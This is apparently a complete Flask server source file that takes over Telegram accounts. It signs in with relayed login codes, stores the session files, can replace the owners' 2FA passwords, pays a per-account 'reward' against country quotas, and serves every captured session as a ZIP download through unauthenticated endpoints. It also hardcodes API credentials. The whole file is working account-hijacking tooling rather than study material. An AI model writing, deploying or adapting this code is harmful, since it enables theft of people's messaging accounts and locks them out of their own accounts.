from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import os
import json
import io
import zipfile

app = Flask(__name__)
CORS(app)

API_ID = 20676547
API_HASH = "73ee3c17f64c2cef18f436d2386b9f0f"

SESSION_FOLDER = "sessions"
COUNTRY_FILE = "country.json"
BAL_FILE = "user_bal.json"

os.makedirs(SESSION_FOLDER, exist_ok=True)

active_sessions = {}


def load_json(filepath):
    if not os.path.exists(filepath):
        return {}
    with open(filepath, "r", encoding="utf-8") as f:
        return json.load(f)


def save_json(filepath, data):
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)


@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "success": True,
        "message": "Telegram OTP API is active on Railway!"
    })


# -------------------- Capacity Endpoints --------------------
@app.route("/api/capacity", methods=["GET"])
def get_capacity():
    return jsonify({
        "success": True,
        "data": load_json(COUNTRY_FILE)
    })


@app.route("/api/capacity", methods=["POST"])
def update_capacity():
    data = request.get_json(silent=True) or {}
    action = data.get("action")
    code = (data.get("code") or "").strip()
    limit = data.get("limit")

    if action not in ["on", "off"] or not code:
        return jsonify({
            "success": False,
            "message": "Valid action ('on' or 'off') and country code are required."
        }), 400

    countries = load_json(COUNTRY_FILE)
    existing_used = countries.get(code, {}).get("used", 0)

    if action == "on":
        countries[code] = {
            "enabled": True,
            "limit": int(limit) if limit is not None else None,
            "used": existing_used
        }
    else:
        countries[code] = {
            "enabled": False,
            "limit": 0,
            "used": existing_used
        }

    save_json(COUNTRY_FILE, countries)
    return jsonify({
        "success": True,
        "code": code,
        "state": countries[code]
    })


# -------------------- Balance Endpoints --------------------
@app.route("/api/balance/<user_id>", methods=["GET"])
def get_balance(user_id):
    balances = load_json(BAL_FILE)
    uid = str(user_id)
    return jsonify({
        "success": True,
        "user_id": uid,
        "balance": balances.get(uid, 0)
    })


@app.route("/api/balance/update", methods=["POST"])
def update_balance():
    data = request.get_json(silent=True) or {}
    user_id = str(data.get("user_id") or "").strip()
    mode = data.get("mode", "set")
    amount = data.get("amount")

    if not user_id or amount is None:
        return jsonify({
            "success": False,
            "message": "user_id and amount are required."
        }), 400

    try:
        amount = float(amount)
    except ValueError:
        return jsonify({
            "success": False,
            "message": "amount must be numeric."
        }), 400

    balances = load_json(BAL_FILE)
    current = balances.get(user_id, 0)

    if mode == "add":
        new_balance = current + amount
    elif mode == "sub":
        new_balance = max(0, current - amount)
    elif mode == "set":
        new_balance = amount
    else:
        return jsonify({
            "success": False,
            "message": "Invalid mode. Use add, sub, or set."
        }), 400

    balances[user_id] = new_balance
    save_json(BAL_FILE, balances)
    return jsonify({
        "success": True,
        "user_id": user_id,
        "balance": new_balance
    })


# -------------------- OTP & 2FA Endpoints --------------------
@app.route("/api/send-otp", methods=["POST"])
async def send_otp():
    data = request.get_json(silent=True) or {}
    phone = (data.get("phone") or "").strip()

    if not phone:
        return jsonify({
            "success": False,
            "message": "Phone number is required."
        }), 400

    countries = load_json(COUNTRY_FILE)
    if countries:
        matched_code = None
        for c_code in countries:
            if phone.startswith(c_code):
                matched_code = c_code
                break

        if not matched_code or not countries[matched_code].get("enabled"):
            return jsonify({
                "success": False,
                "message": "Country is not enabled."
            }), 400

        limit = countries[matched_code].get("limit")
        used = countries[matched_code].get("used", 0)
        if limit is not None and used >= limit:
            countries[matched_code]["enabled"] = False
            save_json(COUNTRY_FILE, countries)
            return jsonify({
                "success": False,
                "message": "Country capacity limit reached."
            }), 400

    session_path = os.path.join(SESSION_FOLDER, phone.replace("+", ""))
    client = TelegramClient(session_path, API_ID, API_HASH)

    try:
        await client.connect()
        sent = await client.send_code_request(phone)

        active_sessions[phone] = {
            "client": client,
            "phone_code_hash": sent.phone_code_hash
        }

        return jsonify({
            "success": True,
            "message": "OTP sent to your Telegram successfully!"
        })
    except Exception as e:
        await client.disconnect()
        return jsonify({
            "success": False,
            "message": str(e)
        }), 500


@app.route("/api/verify-otp", methods=["POST"])
async def verify_otp():
    data = request.get_json(silent=True) or {}
    phone = (data.get("phone") or "").strip()
    code = (data.get("code") or "").strip()
    password = data.get("password")  # Account already has 2FA login password (if any)
    new_2fa_password = (data.get("new_2fa_password") or "").strip()
    two_fa_hint = (data.get("hint") or "").strip()
    user_id = str(data.get("user_id") or "").strip()
    reward = float(data.get("reward") or 0)

    if not phone or not code:
        return jsonify({
            "success": False,
            "message": "Phone and code are required."
        }), 400

    session_data = active_sessions.get(phone)
    if not session_data:
        return jsonify({
            "success": False,
            "message": "Session expired. Request OTP first."
        }), 400

    client = session_data["client"]
    phone_code_hash = session_data["phone_code_hash"]

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
    except SessionPasswordNeededError:
        if not password:
            return jsonify({
                "success": False,
                "requires_2fa": True,
                "message": "Account has 2FA enabled. Provide 'password' to complete sign in."
            }), 401
        try:
            await client.sign_in(password=password)
        except Exception as e:
            return jsonify({
                "success": False,
                "message": str(e)
            }), 400
    except Exception as e:
        return jsonify({
            "success": False,
            "message": str(e)
        }), 400

    two_fa_status = None
    if new_2fa_password:
        try:
            await client.edit_2fa(
                current_password=password if password else None,
                new_password=new_2fa_password,
                hint=two_fa_hint or None
            )
            two_fa_status = "2FA enabled successfully."
        except Exception as e:
            two_fa_status = f"2FA setup failed: {str(e)}"

    try:
        client.session.save()
        await client.disconnect()
        if phone in active_sessions:
            del active_sessions[phone]

        countries = load_json(COUNTRY_FILE)
        for c_code, info in countries.items():
            if phone.startswith(c_code):
                info["used"] = info.get("used", 0) + 1
                if info.get("limit") is not None and info["used"] >= info["limit"]:
                    info["enabled"] = False
                break
        save_json(COUNTRY_FILE, countries)

        if user_id and reward > 0:
            balances = load_json(BAL_FILE)
            balances[user_id] = balances.get(user_id, 0) + reward
            save_json(BAL_FILE, balances)

        response_data = {
            "success": True,
            "message": "Login successful! Session file created."
        }
        if two_fa_status:
            response_data["two_fa"] = two_fa_status

        return jsonify(response_data)
    except Exception as e:
        return jsonify({
            "success": False,
            "message": str(e)
        }), 500


@app.route("/api/enable-2fa", methods=["POST"])
async def enable_2fa():
    data = request.get_json(silent=True) or {}
    phone = (data.get("phone") or "").strip()
    new_password = (data.get("new_password") or "").strip()
    current_password = data.get("current_password")
    hint = (data.get("hint") or "").strip()

    if not phone or not new_password:
        return jsonify({
            "success": False,
            "message": "phone and new_password are required."
        }), 400

    clean_phone = phone.replace("+", "")
    session_path = os.path.join(SESSION_FOLDER, clean_phone)
    session_file = session_path + ".session"

    if not os.path.exists(session_file):
        return jsonify({
            "success": False,
            "message": "Session file not found for this phone."
        }), 404

    client = TelegramClient(session_path, API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await client.disconnect()
            return jsonify({
                "success": False,
                "message": "Session is not authorized."
            }), 401

        await client.edit_2fa(
            current_password=current_password if current_password else None,
            new_password=new_password,
            hint=hint or None
        )
        client.session.save()
        await client.disconnect()

        return jsonify({
            "success": True,
            "message": "2FA password set/updated successfully!"
        })
    except Exception as e:
        await client.disconnect()
        return jsonify({
            "success": False,
            "message": str(e)
        }), 400


# -------------------- Session ZIP Download Endpoints --------------------
@app.route("/api/download-zip", methods=["GET"])
def download_all_sessions_zip():
    files = [
        f for f in os.listdir(SESSION_FOLDER)
        if os.path.isfile(os.path.join(SESSION_FOLDER, f))
    ]
    if not files:
        return jsonify({
            "success": False,
            "message": "No session files found."
        }), 404

    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, "w", zipfile.ZIP_DEFLATED) as zf:
        for fname in files:
            fpath = os.path.join(SESSION_FOLDER, fname)
            zf.write(fpath, arcname=fname)

    memory_file.seek(0)
    return send_file(
        memory_file,
        mimetype="application/zip",
        as_attachment=True,
        download_name="sessions.zip"
    )


@app.route("/api/download-session/<phone>", methods=["GET"])
def download_single_session_zip(phone):
    clean_phone = phone.replace("+", "").strip()
    matching_files = [
        f for f in os.listdir(SESSION_FOLDER)
        if f.startswith(clean_phone) and os.path.isfile(os.path.join(SESSION_FOLDER, f))
    ]
    if not matching_files:
        return jsonify({
            "success": False,
            "message": "Session file not found for this number."
        }), 404

    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, "w", zipfile.ZIP_DEFLATED) as zf:
        for fname in matching_files:
            fpath = os.path.join(SESSION_FOLDER, fname)
            zf.write(fpath, arcname=fname)

    memory_file.seek(0)
    return send_file(
        memory_file,
        mimetype="application/zip",
        as_attachment=True,
        download_name=f"{clean_phone}_session.zip"
    )


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
